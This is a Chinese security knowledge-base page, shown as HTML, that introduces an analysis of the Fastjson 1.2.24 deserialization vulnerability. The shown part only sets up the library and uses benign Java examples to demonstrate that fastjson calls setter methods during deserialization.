<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Fastjson 1.2.24反序列化漏洞分析 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Fastjson 1.2.24反序列化漏洞分析 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前言"><meta data-rh="true" property="og:description" content="前言"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"应用漏洞分析","item":"https://blog.gm7.org/docs/category/应用漏洞分析"},{"@type":"ListItem","position":3,"name":"Fastjson 1.2.24反序列化漏洞分析","item":"https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.188591bd.js" defer="defer"></script>
<script src="/assets/js/main.f3e1b88f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="折叠侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j反序列化漏洞分析">log4j反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析">Fastjson 1.2.24反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson的dnslog探测方式分析">Fastjson的dnslog探测方式分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析">Fastjson各版本漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson1.2.68分析">Fastjson1.2.68分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析">log4j2_rce分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/IDEA远程调试Shiro550">IDEA远程调试Shiro550</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/应用漏洞分析"><span>应用漏洞分析</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Fastjson 1.2.24反序列化漏洞分析</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Fastjson 1.2.24反序列化漏洞分析</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a href="#前言" class="hash-link" aria-label="前言的直接链接" title="前言的直接链接">​</a></h2>
<p>前面讲了JNDI注入相关的知识，不实际操作操作怎么能行呢！</p>
<p>这里就主要分析一下<code>fastjson 1.2.24</code>版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！</p>
<p>这里不同与我们之前分析的反序列化，fastjson是一个非常流行的库，它可以将数据在<code>JSON</code>和<code>Java Object</code>之间互相转换，我们常说的fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong>。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="demo">DEMO<a href="#demo" class="hash-link" aria-label="DEMO的直接链接" title="DEMO的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="环境搭建">环境搭建<a href="#环境搭建" class="hash-link" aria-label="环境搭建的直接链接" title="环境搭建的直接链接">​</a></h3>
<ul>
<li>pom.xml</li>
</ul>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">com.alibaba</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">fastjson</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">1.2.24</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="序列化">序列化<a href="#序列化" class="hash-link" aria-label="序列化的直接链接" title="序列化的直接链接">​</a></h3>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main( String[] args ){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        User user = new User();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        user.setAge(66);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        user.setUsername(&quot;test&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = JSON.toJSONString(user);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class User{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>运行后，得到对应的JSON格式字符串</p>
<p>![image-20210918114938458](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918114938458.png)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="反序列化️">反序列化‼️<a href="#反序列化️" class="hash-link" aria-label="反序列化‼️的直接链接" title="反序列化‼️的直接链接">​</a></h3>
<blockquote>
<p><strong>fastjson反序列化到对应类的过程中</strong>会自动调用目标对象的<code>setXXX</code>方法，例如<code>{&quot;age&quot;:66,&quot;username&quot;:&quot;test&quot;}</code>被反序列化为<code>User</code>类时会自动调用<code>User</code>类的<code>setAge</code>以及<code>setUsername</code>方法，实践出真知</p>
</blockquote>
<p>修改一下<code>User</code>类，在<code>setXXX</code>方法里面添加输出</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">class User{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>修改<code>App</code>启动类，反序列化生成<code>User</code>对象</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSONObject;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main( String[] args ){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = &quot;{\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        User user = JSON.parseObject(json, User.class);	// 后面的User.class表示反序列化为User类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>执行后，可以看到在反序列化的过程中确实调用了<code>setXXX</code>的方法</p>
<p>![image-20210918120111045](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210918120111045.png)</p>
<p>这里我们反序列化使用的是<code>parseObject()</code>方法，其实也可以用到<code>parse()</code>方法，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 <code>JSONObject</code>对象，即 <code>JSON.toJSON()</code>；</p>
